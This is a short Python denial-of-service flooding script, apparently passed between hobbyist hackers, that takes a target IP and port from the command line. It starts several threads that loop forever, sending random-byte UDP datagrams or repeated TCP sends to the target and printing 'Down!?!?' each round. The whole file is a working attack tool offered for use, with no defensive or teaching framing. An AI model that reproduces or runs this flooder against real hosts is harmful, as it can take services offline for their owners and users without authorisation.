#!/usr/bin/env python3
#Code by LeeOn123 modificado by bobozin#STR1CKERST3AM
import argparse
import random
import socket
import threading
import socket
import time
import sys

#Text colors
class Colors:
	Black = "\033[30m"
	Red = "\033[31m"
	Green = "\033[32m"
	Orange = "\033[33m"
	Blue = "\033[34m"
	Purple = "\033[35m"
	Cyan = "\033[36m"
	LightGrey = "\033[37m"
	DarkGrey = "\033[90m"
	LightRed = "\033[91m"
	LightGreen = "\033[92m"
	Yellow = "\033[93m"
	LightBlue = "\033[94m"
	Pink = "\033[95m"
	LightCyan = "\033[96m"
	Reset = "\033[0m"

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=100000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip

def run():
	data = random._urandom(1024)
	i = random.choice(("[✓]","[✓]","[✓]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[31mDown!?!?")
		except:
			print("")

def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip		
												
def run2():
	data = random._urandom(16)
	i = random.choice(("[✓]","[✓]","[✓]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[31mDown!?!?")
		except:
			s.close()
			print("")
			
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run2)
		th.start()